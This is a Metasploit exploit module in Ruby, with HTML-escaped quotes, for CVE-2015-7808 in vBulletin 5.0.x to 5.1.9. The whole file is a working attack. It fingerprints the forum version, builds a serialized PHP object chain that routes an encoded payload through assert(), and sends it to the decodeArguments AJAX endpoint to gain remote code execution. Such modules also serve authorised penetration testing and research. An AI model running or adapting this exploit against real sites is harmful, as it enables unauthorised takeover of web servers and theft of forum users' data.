# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;vBulletin 5.1.2 Unserialize Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a PHP object injection vulnerability in vBulletin 5.1.2 to 5.1.9
      },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
          &#039;Netanel Rubin&#039;,  # reported by
          &#039;cutz&#039;,  # original exploit
          &#039;Julien (jvoisin) Voisin&#039;,  # metasploit module
      ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "\x22",
        },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-7808&#039;],
          [&#039;EDB&#039;, &#039;38629&#039;],
          [&#039;URL&#039;, &#039;http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq&#039;],
          [&#039;URL&#039;, &#039;http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/&#039;]
        ],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [
          [ &#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }  ],
          [&#039;vBulletin 5.0.X&#039;, {&#039;chain&#039; => &#039;vB_Database&#039;}],
          [&#039;vBulletin 5.1.X&#039;, {&#039;chain&#039; => &#039;vB_Database_MySQLi&#039;}],
      ],
      &#039;DisclosureDate&#039; => &#039;Nov 4 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to the web application", "/"])
        ], self.class)
  end

  def check
      begin
          res = send_request_cgi({ &#039;uri&#039; => target_uri.path })
          if (res && res.body.include?(&#039;vBulletin Solutions, Inc.&#039;))
              if res.body.include?("Version 5.0")
                  @my_target = targets[1] if target[&#039;auto&#039;]
                  return Exploit::CheckCode::Appears
              elsif res.body.include?("Version 5.1")
                  @my_target = targets[2] if target[&#039;auto&#039;]
                  return Exploit::CheckCode::Appears
              else
                  return Exploit::CheckCode::Detected
              end
          end
      rescue ::Rex::ConnectionError
          return Exploit::CheckCode::Safe
      end
  end

  def exploit
    print_status("#{peer} - Trying to inferprint the instance...")

    @my_target = target
    check_code = check

    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
      fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable instance")
    end

    if @my_target.nil? || @my_target[&#039;auto&#039;]
      fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target...")
    end

    print_status("#{peer} - Exploiting #{@my_target.name}...")

    chain = &#039;O:12:"vB_dB_Result":2:{s:5:"*db";O:&#039;
    chain << @my_target["chain"].length.to_s
    chain << &#039;:"&#039;
    chain << @my_target["chain"]
    chain << &#039;":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:&#039;
    chain << "#{payload.encoded.length}:\"#{payload.encoded}\";}"

    chain = Rex::Text.uri_encode(chain)
    chain = chain.gsub(/%2a/, &#039;%00%2a%00&#039;)  # php and Rex disagree on &#039;*&#039; encoding

    send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;ajax/api/hook/decodeArguments&#039;),
        &#039;vars_get&#039; => {
            &#039;arguments&#039; => chain
      },
       &#039;encode_params&#039; => false,
    })
  end
end

